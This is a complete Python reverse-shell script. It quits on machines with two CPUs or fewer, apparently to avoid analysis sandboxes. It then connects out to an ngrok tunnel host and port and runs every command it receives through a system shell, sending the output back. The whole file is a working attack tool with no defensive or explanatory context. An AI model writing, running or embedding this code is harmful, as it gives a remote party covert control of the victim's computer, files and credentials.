import os
import socket
import subprocess

if os.cpu_count() <= 2:
    quit()

HOST = '0.tcp.ngrok.io'
PORT = 12249

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(str.encode("[*] Connection Established!"))

while True:
    try:
        s.send(str.encode(os.getcwd() + "> "))
        data = s.recv(1024).decode("UTF-8")
        data = data.strip('\n')
        
        if data == "quit":
            break
        
        if data.startswith("cd "):
            os.chdir(data[3:])
            continue
        if len(data) > 0:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value, stderr_value = proc.communicate()
            output_str = stdout_value.decode("cp437") + stderr_value.decode("cp437")
            s.send(str.encode(output_str + os.getcwd() + "> "))
    
    except Exception as e:
        s.send(str.encode("Error occurred: " + str(e) + "\n"))
        continue

s.close()
